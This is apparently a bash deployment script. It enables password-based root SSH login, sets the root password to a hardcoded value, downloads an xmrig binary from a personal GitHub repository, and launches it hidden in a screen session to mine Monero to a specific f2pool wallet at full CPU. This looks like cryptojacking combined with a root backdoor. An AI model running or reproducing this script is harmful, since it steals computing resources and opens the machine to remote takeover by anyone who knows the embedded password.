#!/usr/bin/env bash
echo ZZzz83181723 | sudo -S 'sudo root'
sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
sudo sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
sudo sed -i 's/PermitRootLogin without-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
sudo service sshd restart
echo -e 'z83181723\nz83181723' | (sudo passwd --stdin root)

sudo wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 http://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
sudo rpm -ivh epel-release-latest-7.noarch.rpm

sudo yum install -y screen git unzip gcc htop

sudo wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 https://github.com/opsengine/cpulimit/archive/master.zip -O cpulimit.zip
sudo unzip cpulimit.zip
sudo cd cpulimit-master
sudo make
sudo cp src/cpulimit /usr/bin
sudo cd ~
sudo rm -rf cpulimit-master
sudo rm -f cpulimit.zip

sudo wget --tries=0 --retry-connrefused --waitretry=5 --read-timeout=20 https://github.com/andreevnodar89/ZTSZTS/raw/master/xmrig -O xmrig
sudo chmod +x ./xmrig

sudo screen -dmSL MM bash -c "./xmrig -o xmr.f2pool.com:13531 -u 48nQPrR5Gk7XNDrYr7Q922U4qSEmJGdwjjays4Ufb2A38Lxz2B8HCMAQMazcyUxiGCgmz2q3jfMNXUjFULv1W3Pn3FDYcAr.Namseong -p x --donate-level=0 --threads=4 --randomx-init=4 --max-cpu-usage=100 --randomx-1gb-pages --randomx-1gb-pages --keepalive --cpu-priority=0"